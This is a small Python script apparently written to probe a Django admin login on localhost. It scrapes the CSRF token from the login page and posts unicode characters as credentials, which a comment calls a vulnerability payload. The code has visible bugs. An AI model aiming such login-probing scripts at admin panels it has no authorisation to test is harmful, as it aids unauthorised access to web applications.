#
# Django Recon
#
# Henry Samuelson 11/29/18

# This is built to work assuming server is running on localhost

import requests
from bs4 import BeautifulSoup

def ui():
    #system('cls')
    print("DJango Recon")
    input1 = str(raw_input("Target Admin page url (str)> "))
    requestPage(input1)
    pass


def requestPage(url = 0):#url):

    client = requests.session() #Set Session for requests

    # first get csrf token by stealing csrf from body of return html
    r = client.get('http://localhost:8000/admin/login/?next=/admin/', auth=('user', 'pass'))
    r = r.text
    r = r[r.find('value'):] # search html for csrf value
    token = str(r[7:r.find('"', 7)]) # get csrf token


    # Payload with unicode vonerability
    payload = {'username': '漢', 'password': '漢' , "csrfmiddlewaretoken":token}
    r = client.post('http://localhost:8000/admin/login/?next=/admin/', data = payload)
    #r = r.json()
    print(r.text)
    file = open("outputer.html", "w")
    file.write(str(r.text))
    return r.text

def parseHTML(html_doc, file = False):
    """
    Takes html str

    Returns: str, all text inside of html document
    """
    assert type(html_doc) == str

    if(file == True): #is a file name
        contents = open(html_doc, 'r')
        html_doc = contents1.read()
        contents.close()
    return BeautifulSoup(html_doc, 'html.parser')
    #fileContents = BeautifulSoup(html_doc, 'html.parser')
    #return fileContents.get_text()

def textOfInterest(soup):
    contents = []
    for line in soup.get_text().split('\n'):
        if(line != ''):
            temp = line.split()
            temp =  str(temp)[1:len(str(temp))-1]
            contents.append(temp)

    fContent = [] #this will be in an ordered method:  [header-1, contents-1, header-n,contents-n]
    for i in range(1, len(contents)):
        if(contents[i].isupper()):
            # Add this line and line below it.
            fContent.append(contents[i])
            fContent.append(contents[i+1])

    return fContent

requestPage()
